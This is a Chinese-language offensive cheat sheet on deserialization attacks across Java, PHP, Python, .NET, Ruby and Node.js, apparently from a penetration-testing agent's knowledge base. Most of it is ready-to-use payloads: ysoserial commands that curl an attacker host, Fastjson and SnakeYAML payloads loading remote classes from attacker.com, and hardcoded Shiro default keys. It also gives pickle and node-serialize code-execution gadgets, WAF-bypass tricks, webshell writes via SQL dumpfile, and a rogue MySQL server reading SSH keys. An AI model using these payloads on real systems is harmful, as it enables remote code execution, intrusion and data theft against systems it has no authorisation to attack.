# 反序列化漏洞专题

> Java/PHP/Python/.NET/Ruby/Node.js 全栈指纹、gadget 链矩阵、Shiro/WebLogic/ViewState 实战链。
> 基础速查见 web-vulnerabilities.md 逻辑类。

---

## 1. 流量指纹

| Magic (Hex) | Base64 | 格式 |
|---|---|---|
| `AC ED 00 05` | `rO0AB` | Java 序列化 |
| `00 01 00 00 00 FF FF FF FF` | `AAEAAAD/////` | .NET BinaryFormatter |
| `FF 01` | `/w` | .NET ViewState |
| `80 02/03/04/05` | - | Python pickle 协议 2-5 |
| `4F 3A` / `61 3A` | `Tz` / `YT` | PHP 对象 `O:` / 数组 `a:` |
| `04 08` | - | Ruby Marshal |
| `48 02` / `63` | - | Hessian 2.0/1.0 |
| `1F 8B` | `H4s` | Gzip 包裹 |

Content-Type 风险：`x-java-serialized-object`（Critical）｜hessian/amf（Critical）｜yaml 查 `!!` 标签｜JSON 含 `$type`（JSON.NET）｜XML 含 `<dynamic-proxy>`（XStream）。
Cookie 模式：`rememberMe`=Shiro｜`__VIEWSTATE`=ASP.NET｜`rack.session`=Ruby Marshal｜`ci_session`=PHP｜`_session_id`+二进制=pickle/JSON。
快速识别：`echo "BASE64" | base64 -d | xxd | head -1`。

## 2. Java

> WAF 拦字面 payload 时先试 Ghost Bits 变体: BCEL ClassLoader 每字节 Ghost 化（`$$BCEL$$`+CJK）、Fastjson `\u４_type`/`\x4_type` 还原 @type、Jackson `\u丰丰耳失` 走私 SQL——见 `ghost-bits-cast-attack.md` §4.2/§4.3。

```bash
java -jar ysoserial.jar CommonsCollections1 "curl http://ATTACKER/pwned" | base64 -w0
# 安全确认: java -jar ysoserial.jar URLDNS "http://TOKEN.collab.net"（DNS 命中=确认反序列化点）
```

**CC 链矩阵**：CC1/CC3（CC3.x 3.0-3.2.1，JDK<8u72）｜CC2/CC4（CC4.x，TemplatesImpl 字节码）｜CC5（JDK≥8，TiedMapEntry）｜CC6/CC7（全 JDK，HashSet/Hashtable 触发）。**优先 CC6→CC7→CC5**。
其他：CommonsBeanutils1（BU 1.6.1-1.9.4，有 no-CC 变体）、Spring1/2、Groovy1（1.7-2.4）、Hibernate1/2、Jdk7u21（仅 7u21）、JRMPClient（回连 RMI 链式）、ROME/C3P0（JNDI）。
决策树：CC3.x→按 JDK 选 CC1/3 或 CC5/6/7；CC4.x→CC2/4；无外部库→URLDNS 先确认→Jdk7u21→JRMPClient；未知→CC6→CB1→URLDNS。

**Shiro（SHIRO-550）**：rememberMe=AES-CBC(序列化对象)。检测=响应设 `rememberMe=deleteMe`。默认 key 依次试：`kPH+bIxk5D2deZiIxcaaaA==`、`wGJlpLanyXlVB1LUUWolBg==`、`4AvVhmFLUs0KTA3Kprsdag==`、`Z3VucwAAAAAAAAAAAAAAAA==`。流程：URLDNS+dnslog 确认→CC6 payload→AES-CBC 加密（随机 IV）→base64→cookie。随机 key 后走 SHIRO-721（padding oracle）。

**Fastjson 版本矩阵**：1.2.22-24 无需 autoTypeSupport——TemplatesImpl 链 `{"@type":"...xsltc.trax.TemplatesImpl","_bytecodes":["恶意类 Base64（defineClass，类继承 AbstractTranslet）"],"_name":"a.b","_tfactory":{},"_outputProperties":{}}`（需 Feature.SupportNonPublicField）｜≤1.2.47 两段式绕黑名单（java.lang.Class 缓存）: `{"a":{"@type":"java.lang.Class","val":"com.sun.rowset.JdbcRowSetImpl"},"b":{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker:1389/Exploit","autoCommit":true}}`（JNDI 外连需出网）｜@type 解析报错回显版本；1.2.47 后需 autoType 开启或新 gadget。

**WebLogic**：T3（7001，nmap 识别）｜XMLDecoder（CVE-2017-10271，`/wls-wsat/CoordinatorPortType`）｜IIOP。
**RMI Registry**（1099）：`ysoserial.exploit.RMIRegistryExploit TARGET 1099 CC1 "id"`（JDK≤8u111 无 JEP 290）。

**JDK 远程类加载约束**：<8u121 全开｜8u121-8u190 仅 LDAP｜≥8u191 全断→绕过=LDAP 返回序列化 gadget（走本地链）。

**SnakeYAML**：`Yaml.load` 无 SafeConstructor 时 `!!` 构造任意类。
```yaml
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/exploit.jar"]]]]
```
JAR 结构：`META-INF/services/javax.script.ScriptEngineFactory`→Exploit（静态块执行）。SPI 变体（Java 9+）：`!!sun.misc.Service [!!java.lang.ProcessBuilder [["curl",...]]]`。

**Hessian/Kryo/Avro/XStream**：Hessian（Dubbo/Spring Remoting/Resin；marshalsec.Hessian + SpringPartiallyComparableAdvisorHolder→JNDI）｜Kryo（`setRegistrationRequired(false)` 时任意类；Spark/Kafka 场景）｜XStream（`<dynamic-proxy>`+EventHandler→ProcessBuilder，pre-1.4.7；Jenkins 常见）。

## 3. PHP

魔术方法序：`__wakeup`（unserialize 即调）→`__destruct`（GC）→`__toString`（作字符串）→`__call`（不可访问方法）。
格式：`O:8:"ClassName":2:{s:4:"prop";s:5:"value";}`；私有属性名带 `\0ClassName\0` 前缀。
PMA_Config 任意读：`configuration=O:10:"PMA_Config":1:{s:6:"source";s:11:"/etc/passwd";}`。
create_function 组合：`$b=";}system('id');/*";` 闭 lambda 体注入命令。

**PHPGGC**：`phpggc Laravel/RCE1 system id`；链族 Laravel/RCE1-10、Symfony、Guzzle、Monolog、WordPress、Slim。
**ThinkPHP POP 链**：入口 think\Model `__destruct`——`lazySave` 置 true 触发，经 think\Pipeline handler 联动组合写入 webshell/执行代码。手写形态 `O:10:"think\Model":3:{s:8:"lazySave";b:1;...}`；各小版本链结构有差异，优先 phpggc 按版本选择生成。
**Typecho**：install.php 可访问且 config.inc.php 存在时，Cookie `__typecho_config`（base64 序列化）→ Typecho_Feed/__toString + Typecho_Request/__get 链，pre-auth 文件写入/SQL 执行。检测: /install.php 是否进安装向导。
**Phar**：phar:// metadata 反序列化——`file_exists/is_file/fopen/filesize/getimagesize/include` 等文件操作即触发，无需 unserialize()。流程：上传 JPEG+phar polyglot→诱发 `file_exists("phar://uploads/avatar.jpg")`→gadget 执行。

**绕过与利用技巧族**:
- **__wakeup 绕过**: ①CVE-2016-7124（php<5.6.25/7.0.10）: 属性数改大于实际 `O:1:"A":2:{...1 属性...}` wakeup 跳过 ②**fast destruct 提前析构**: 目标类析构链可用但 wakeup 挡路时，payload 尾部截断+补 `;}` 强制 unserialize 提前失败触发 GC——`__destruct` 先于流程执行（数组包裹/引用打断同理），不依赖 CVE
- **字符逃逸两向**: filter 对序列化串做替换时——增长向（替换后变长顶出后续字段）/收缩向（变短吞掉后续属性名，控制被吞长度使恶意字段顶位）——先测 filter 变长还是变短定方向，payload 按差值 padding
- **S: 大写类型 hex 转义**: `s:4:"test"` → `S:4:"\74\65\73\74"`（\xx 十六进制）——绕 strstr/黑名单字符检测，序列化语义不变
- **php7.1+ 属性可见性不敏感**: public/protected/private 声明对反序列化无影响——无 `\0ClassName\0` 前缀的裸属性名也注入（构造 payload 免二进制脏字符）
- **指针引用 r/R**: 序列化串内 `R:n` 指针引用使两属性指向同值（改一俱改）构造共享/自引用; `r:n` 对象引用——构造循环引用或强制 GC 顺序; **R 引用绕"反序列化后随机化赋值"**: 服务端 unserialize 后对属性赋随机值再比较（token=md5(mt_rand()) 与 password ===）时，payload 里 `token=&password` 引用绑定——随机值赋给 token 的瞬间 password 同步，恒等比较必然通过
- **session 反序列化引擎差异**: `session.serialize_handler` 取 php（`|key` 分隔）/php_serialize（标准 serialize）/php_binary（键长前缀）——**读写脚本引擎不一致时注入跨引擎 payload**: php 引擎读 php_serialize 写入的会话时 `|` 后全当序列化数据（`$_SESSION['x'] = '|serialized_payload'` → 引擎切换后反序列化执行）; session.upload_progress 亦可作载体（见 path-traversal-lfi §3）
- **O:+ 绕 `[oc]:\d+:` 正则**: 序列化长度前允许 `+` 号——`O:11:`→`O:+11:` 合法且不匹配该正则（`str_replace("O:","O:+")` 后 urlencode）; 仅对象类型 O/C 可加，属性 s:i: 数字段无此特性
- **__unserialize 优先于 __wakeup**: 同类同时定义两魔术方法时只有 __unserialize 生效（php7.4+）——__wakeup 内的 die/清空等防御形同虚设，审计先查同类是否有 __unserialize; 其接收 ['属性'=>值] 数组，属性全可控等价于 wakeup 入口

## 4. Python

```python
class E:
    def __reduce__(self): return (os.system, ("id",))
pickle.dumps(E())
```
sink：`pickle.loads/load`、`yaml.load`（无 SafeLoader）、`jsonpickle.decode`、`shelve.open`、`marshal.loads`（与 pickle 同危但极少被沙箱——反序列化任意 code object，`types.FunctionType(marshal.loads(b64decode(data)), globals())` 即服务端 globals 内任意执行; 服务端收 base64 marshal 数据执行为函数时注入 `marshal.dumps(payload.__code__)` 外带 flag）。
分析：`pickletools.dis(payload)` 看 GLOBAL 引用。
RestrictedUnpickler 审计：白名单含 `eval/exec/__import__` 即仍可利用。
**Celery 队列注入**（emerging-ctf CeleRace 链）: SSRF 打到内网 Redis 时可直接向 Celery broker 队列 LPUSH 恶意任务消息——Celery worker 取任务即反序列化执行（配 pickle 任务序列化时=RCE）; 链式利用: session 路径穿越拿权限→Redis SSRF→队列注入→worker 命令执行。

## 5. .NET

**BinaryFormatter**：`ysoserial.exe -f BinaryFormatter -g TypeConfuseDelegate -c "whoami" -o base64`。
**ViewState**：密钥=web.config machineKey（LFI 读/备份/产品默认 key/Azure WEBSITE_AUTH_ENCRYPTION_KEY）。伪造：`ysoserial.exe -p ViewState -g TextFormattingRunProperties -c ... --path --apppath --decryptionkey --validationkey --islegacy`。无密钥：.NET<4.5+`enableViewStateMac=false` 直接构造；Blacklist3r 默认 key 爆破。
**JSON.NET**：`TypeNameHandling != None`（Auto/Objects/Arrays/All 均危险）→ `$type` 注 ObjectDataProvider/Process 或 AssemblyInstaller（Path=UNC 加载 dll）。
**XmlSerializer**：`<ObjectDataProvider MethodName="Start">` + ProcessStartInfo。
gadget：TypeConfuseDelegate、TextFormattingRunProperties、ObjectDataProvider、ExpandedWrapper、PSObject。

## 6. Ruby

Marshal：`\x04\x08` 头；`Marshal.load` 不可信数据=RCE。
YAML.load（≠safe_load）：
- ≤2.7.2 Gem::Requirement 链：`!ruby/object:Gem::Source` 的 `path: "| cmd"`。
- 2.x-3.x Gem::Installer 链：Net::WriteAdapter→`socket: !ruby/module 'Kernel'`+`method_id: :system`+`git_set: <cmd>`。
- Psych 4.0（Ruby 3.1+）YAML.load 默认安全，需 `unsafe_load` 才危险。

## 7. Node.js

node-serialize：`{"rce":"_$$ND_FUNC$$_function(){require('child_process').exec('id')}()"}`（尾部 `()`=IIFE 立即执行）。
funcster：`{"__js_function":"function(){...constructor.constructor('return require')()('child_process')...}"}`。
cryo 同 funcster 攻击面。

## 8. 工具

ysoserial（Java）｜ysoserial.net（.NET）｜marshalsec（Hessian/XStream/JNDI）｜PHPGGC｜Blacklist3r（ViewState key）｜GadgetInspector（classpath gadget 自动发现）｜SerializationDumper/jdeserialize（Java 序列化流解析）。

## 9. 关联文件

- `$AGENT_DIR/knowledge-base/jndi-injection.md` — JNDI 注入专题（JDK 版本约束与 LDAP gadget 绕过的攻击侧展开、Log4Shell/BeanFactory+EL/工具链）
- `$AGENT_DIR/knowledge-base/ssti.md` — §6 EL 注入


## 10. 增补 gadget 与链
| 技术 | 要点 |
|------|------|
| Castor XML xsi:type | 无映射文件的 Unmarshaller 信任 xsi:type——任意类实例化: PropertyPathFactoryBean+SimpleJndiBeanFactory→RMI→ysoserial JRMP+CommonsBeanutils1。Java 17+ 模块限制失效 |
| 恶意 MySQL 服务端 | 协议允许服务端对任意查询回 0xfb 文件请求包→客户端静默读本地文件回传（LOAD DATA LOCAL 默认开）。目标: /proc/self/environ、config.php、.ssh/id_rsa。触发: 应用连可控 MySQL 主机 |
| MYSQLI_INIT_COMMAND | config 参数注入 mysqli set_opt——option 3 连接后执行任意 SQL: `select 0x<hex webshell> into dumpfile '/path/x.php'`（DUMPFILE 保原始字节; 已存在即败; secure_file_priv 限制） |
| Pickle STOP 剥离链 | dumps(Redirect())[:-1]+dumps(Execute())——单次 loads 执行两个 __reduce__; dup2(5,1) 重定向 stdout 到 socket 回显 |
| 序列化后膨胀逃逸 | serialize 后词替换（where→hacker 5→6 字节）造成 s:N 错位——str_repeat("where", len(payload))+payload 使残留数据被解析为后续字段注入 photo/config 属性 |
| SoapClient | 见 ssrf-advanced.md N 节（__call 触发 + CRLF 走私） |
